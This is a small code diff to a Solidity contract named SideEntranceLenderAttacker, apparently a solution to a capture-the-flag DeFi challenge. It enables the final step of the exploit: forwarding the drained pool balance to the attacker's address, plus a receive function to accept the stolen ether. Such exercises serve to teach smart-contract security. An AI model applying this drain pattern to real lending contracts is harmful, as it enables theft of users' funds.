@@ -40,8 +40,8 @@ contract SideEntranceLenderAttacker is Ownable {
             )
         );  
 
-        require(0 == 1, "going in");
-
-        // payable(owner()).sendValue(address(this).balance);
+        payable(owner()).sendValue(address(this).balance);
     }
+
+    receive() external payable {}
 }
